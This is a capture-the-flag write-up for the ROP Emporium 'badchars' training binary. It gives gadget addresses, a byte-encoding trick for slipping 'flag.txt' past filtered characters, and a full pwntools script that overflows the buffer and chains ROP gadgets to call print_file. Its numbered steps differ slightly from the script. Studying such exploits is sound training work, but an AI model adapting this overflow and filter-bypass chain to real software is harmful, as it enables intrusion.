# badchars (ROP Emporium 5)

## Information

write4と大体同じ

compare badchars: 'x', 'g', 'a', '.' as '0x78', '0x67', '0x61', '0x2e' -> 0xeb

### just idea
1. set r12: "flag.txt" (with ROP gadget)
2. set r13: 0x601028
3. call usefulGadget: 0x400628
4. set rdi: 0x601028
5. call `print_file`: 0x400510

'flag.txt': `a`, `g`, `.`, `x` are badchars 

### usefulGadgets
```asm
400628:	45 30 37             	xor    BYTE PTR [r15],r14b
40062b:	c3                   	ret
40062c:	45 00 37             	add    BYTE PTR [r15],r14b
40062f:	c3                   	ret
400630:	45 28 37             	sub    BYTE PTR [r15],r14b
400633:	c3                   	ret
400634:	4d 89 65 00          	mov    QWORD PTR [r13+0x0],r12
400638:	c3                   	ret
400639:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
```

[r15] = [r15] ^ r14b

```
f  l  a  g  .  t  x  t
66 6c 61 67 2e 74 78 74
66 6c 62 68 62 74 79 74
      -1 -1-34    -1
```

### Gadget
```asm
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006a0 : pop r14 ; pop r15 ; ret
0x00000000004006a2 : pop r15 ; ret

0x00000000004006a3 : pop rdi ; ret
```

### Stack
```bash
00:0000│ rsp 0x7fffffffdc10 ◂— 0
... ↓        3 skipped
04:0020│ rsi 0x7fffffffdc30 ◂— 0xa6a696f647361 /* 'asdoij\n' */
05:0028│-018 0x7fffffffdc38 ◂— 0
... ↓        2 skipped
08:0040│ rbp 0x7fffffffdc50 —▸ 0x7fffffffdc60 ◂— 1
09:0048│+008 0x7fffffffdc58 —▸ 0x400610 (main+9) ◂— mov eax, 0
```

## Solution
1. set r12: "b"*8
2. set r13: 0x601030
3. call usefulGadget: 0x400634  (fin -> 0x601030: flbbbbbb)
4. set r15: 0x601032 (a)
5. set r14: 0x1
6. call usefulGadget: 0x400630
7. set r15: 0x601033 (g)
8. call usefulGadget: 0x400630
9. set r15: 0x601036 (x)                 
10. call usefulGadget: 0x400630
11. set r15: 0x601034 (.)
12. set r14: 0x34
13. call usefulGadget: 0x400630
14. set rdi: 0x601030
15. call `print_file`: 0x400510

## Script
```python
from pwn import *

#conn = gdb.debug('./badchars')
conn = process('./badchars')

payload = b'A'*0x28
payload += p64(0x40069c)
payload += b'flbhbtyt'    # r12
payload += p64(0x601030)  # r13
payload += p64(0x601038)  # r14, dummy
payload += p64(0x601038)  # r15, dummy but available address
payload += p64(0x400634)  # usefulGadgets

payload += p64(0x4006a0)
payload += p64(0x1) # r14
payload += p64(0x601032) # r15
payload += p64(0x400630) # usefulGadgets

payload += p64(0x4006a2)
payload += p64(0x601033)
payload += p64(0x400630)

payload += p64(0x4006a2)
payload += p64(0x601036)
payload += p64(0x400630)

payload += p64(0x4006a0)
payload += p64(0x34)
payload += p64(0x601034)
payload += p64(0x400630)

payload += p64(0x4006a3)
payload += p64(0x601030)
payload += p64(0x400510)

conn.sendlineafter('> ', payload)
conn.interactive()
```